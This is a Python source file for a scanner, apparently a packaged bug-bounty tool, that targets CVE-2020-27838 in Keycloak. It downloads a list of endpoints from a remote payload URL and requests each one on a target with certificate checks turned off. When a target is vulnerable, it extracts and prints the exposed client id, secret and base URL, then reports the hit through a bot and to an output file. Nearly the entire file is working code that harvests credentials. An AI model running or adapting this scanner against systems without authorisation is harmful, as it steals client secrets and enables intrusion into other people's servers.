#!/usr/bin/env python

"""
 * CVE-2020-27838
 * CVE-2020-27838 Bug scanner for WebPentesters and Bugbounty Hunters
 *
 * @Developed By Cappricio Securities <https://cappriciosec.com>
 */
 
"""
from cve202027838.includes import bot
from cve202027838.utils import configure
import json
import requests
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote
from cve202027838.includes import writefile
from cve202027838.utils import const
from urllib.parse import urlparse


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def cvescan(url, output):
    try:
        with requests.Session() as session:
            payreq = session.get(const.Data.payloadurl)
            for endpoint in payreq.text.splitlines():
                encode = quote(endpoint)
                if url.endswith('/'):
                    url = url[:-1]
                fullurl = f'{url}/{endpoint}'
                try:
                    response = session.get(
                        fullurl, verify=False, headers=const.Data.rheaders, allow_redirects=False, timeout=5)
                    print(f'Checking ===> {fullurl}')
                    if response.status_code == 200 and "security-admin-console" in response.text and "secret" in response.text:
                        outputprint = (
                            f"\n{const.Colors.RED}💸[Vulnerable]{const.Colors.RESET} ======> "
                            f"{const.Colors.BLUE}{url}{const.Colors.RESET} \n"
                            f"{const.Colors.MAGENTA}📸PoC-Url->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}\n\n\n")
                        print(outputprint)
                        poc = json.loads(response.text)
                        print(f"{const.Colors.RED}Id{const.Colors.RESET} =====> {poc['id']}\n{const.Colors.RED}Secret{const.Colors.RESET} =====> {poc['secret']}\n{const.Colors.RED}BaseUrl{const.Colors.RESET} =====> {poc['baseUrl']}")
                        

                        if configure.check_id() == "Exist":
                            bot.sendmessage(fullurl)
                            
                            
                        if output is not None:
                            writefile.writedata(
                                output, str(f'{fullurl}\n'))
                        break
                except requests.exceptions.RequestException as e:
                    print(
                        f'{const.Colors.MAGENTA}Invalid Domain ->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}: {e}')
    except requests.exceptions.RequestException as e:
        print(f"Check Network Connection: {e}")
